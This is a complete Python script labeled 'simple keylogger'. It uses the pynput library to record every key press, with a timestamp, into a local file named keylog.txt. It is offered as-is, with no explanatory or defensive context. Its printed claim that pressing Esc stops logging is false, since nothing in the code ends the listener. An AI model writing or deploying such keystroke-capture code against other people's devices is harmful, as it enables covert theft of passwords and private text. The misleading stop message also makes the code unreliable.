#simple keylogger

from pynput import keyboard
import time
def on_key_press(key):
    log_file = open("keylog.txt", "a")
    timestamp = time.strftime("%y-%m-%d %H:%M:%S", time.localtime())
    log_file.write(f"{timestamp} - {key}\n")
    log_file.close()

def main():
    print("press esc to stop logging.")
    with keyboard.Listener(on_press=on_key_press) as listener:
        listener.join()

if __name__ == "__main__":
    main()